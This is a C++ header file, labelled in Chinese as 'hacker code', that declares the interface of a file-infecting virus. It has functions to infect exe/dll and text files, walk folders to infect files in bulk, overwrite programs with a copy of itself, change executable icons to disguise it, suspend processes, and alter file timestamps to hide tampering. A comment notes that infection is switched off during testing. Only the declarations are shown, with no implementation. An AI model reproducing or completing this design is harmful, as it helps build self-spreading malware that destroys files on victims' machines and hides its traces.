//-----------------------------------------------------------------------------
//
//                      黑客代碼
//                                          @2015-03-19阿甘整理
//-----------------------------------------------------------------------------
#pragma once

#include "WinHack_typedef.h"
#include <string>
using namespace std;

#define DANGE_OFF    //测试时感染关闭

//感染二进制文件
SQC_API void hack_Infectexedll(const char* Filename);
//感染文本文件
SQC_API void hack_InfectTXT(const char* Filename);
//修改exe/dll图标的算法[IconFile=""用本程序图标直接换exe图标]
SQC_API bool hack_ExeChangeIcon(char* ExeFile, char* IconFile = "");
//遍历某种类型做操作处理[注意Typename="" 为任意类型] 此算法做处理参考
SQC_API void hack_LoopThoseFile(const char* PathName, const char* Typename = "");
//遍历二进制类型做操作处理[注意Typename="" 为任意类型]
SQC_API void hack_LoopInfectFile(const char* PathName, const char* Typename = "");
//替换程序 PathName处理路径 当前程序路径
SQC_API void hack_LoopCopySelfexe(const char* PathName, const char* selfpath);
//遍历文本类型做批量操作处理[]
SQC_API void hack_LoopInfectTxt(const char* PathName, const char* Typename = "txt");
//遍历程序修改图标
SQC_API void hack_LoopIconExeFile(const char* PathName);
//TD线程处理
SQC_API void hack_ThreadFile(void);
//仿线程名[ff=0非阻塞 1阻塞]
SQC_API int hack_ZwNtSuspendProcess(int ff = 0);
//修改文件的创建和修改时间
SQC_API void hack_updateexetime(const char* f_name);








